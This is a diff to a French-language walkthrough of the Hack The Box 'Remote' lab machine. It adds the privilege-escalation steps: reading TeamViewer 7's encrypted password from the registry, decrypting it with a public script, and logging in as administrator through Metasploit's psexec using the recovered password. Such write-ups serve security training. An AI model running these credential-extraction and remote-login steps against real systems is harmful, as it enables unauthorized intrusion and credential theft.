@@ -81,5 +81,37 @@ $ python3 exploit.py -u "admin@htb.local" -p "baconandcheese" -i 'http://10.10.1
 Après avoir reçu la connection sur netcat, nous allons regarder le fichier user.txt situé dans user/public.
 
 # Obtenir un accès Administrateur
+En jetant un oeil sur les logiciels installés, nous pouvons voir TeamViewer :
+```bash
+$ ls "C:\Program Files (x86)"
+```
+![Pic11](../img/remote11.PNG?raw=true) </br>
+Il s'agit là d'une ancienne version de TeamViewer : version 7. Un exploit est disponible en ligne :</br>
+https://whynotsecurity.com/blog/teamviewer/</br>
+En résumé :
+*Teamviewer garde les mot de passes dans le registre sous la valeur SecurityPasswordAES
+*Les mot des passes sont chiffrés avec AES-128-CBC dont on a la Key et l'IV.
+</br>
 
+D'abord, il faut énumérer la clé de registre qui correspond à TeamViewer pour avoir le mot de passe chiffré :
+```bash
+$ reg query HKLM\SOFTWARE\Wow6432Node\TeamVierwer\Version7
+```
+![Pic12](../img/remote12.PNG?raw=true) </br>
 
+Puis nous le crackons avec le script python vu dans le blog de whynotsecurity (ne pas oublier de remplacer la string correspondante au mot de passe) :
+```bash
+$ python3 decrypt.py
+```
+![Pic13](../img/remote13.PNG?raw=true) </br>
+Maintenant nous pouvons nous connecter sur la machine avec le PsExec de metasploit et chercher le root.txt :
+```bash
+$ msfconsole
+msf > use windows/smb/psexec
+msf > set rhost 10.10.10.180
+msf > set SMBUser administrator
+msf > set SMBPass !R3m0te!
+msf > run
+Meterpreter > cat C:\\Users\Administrator\\Desktop\\root.txt
+```
+![Pic14](../img/remote14.PNG?raw=true) </br>
